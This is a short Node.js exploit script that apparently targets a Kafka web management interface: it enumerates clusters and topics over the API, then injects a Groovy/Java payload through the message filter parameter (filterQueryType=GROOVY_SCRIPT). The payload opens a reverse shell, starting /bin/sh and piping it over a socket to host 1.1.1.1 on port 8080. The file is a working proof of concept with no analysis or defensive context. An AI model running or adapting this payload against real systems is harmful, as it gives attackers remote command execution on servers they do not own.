const axios = require('axios')

const url = 'http://localhost:8080'
clusters = null

payload =
  'String host="1.1.1.1";int port=8080;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'

axios.get(`${url}/api/clusters`).then((res) => {
  console.log(res.data)
  clusters = res.data
  if (clusters.length == 0) {
    console.log('No clusters found')
    return
  }
  cluster = clusters[0].name

  axios
    .get(
      `${url}/api/clusters/${cluster}/topics?showInternal=true&search=&orderBy=NAME&sortOrder=ASC`
    )
    .then((res) => {
      topics = res.data.topics
      if (topics.length == 0) {
        console.log('No topics found')
        return
      }
      topic = topics[0].name
      axios
        .get(
          `${url}/api/clusters/local/topics/${topic}/messages?q=${encodeURIComponent(
            payload
          )}&filterQueryType=GROOVY_SCRIPT&attempt=2&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING`
        )
        .then((res) => {
          console.log(res.data)
        })
    })
})
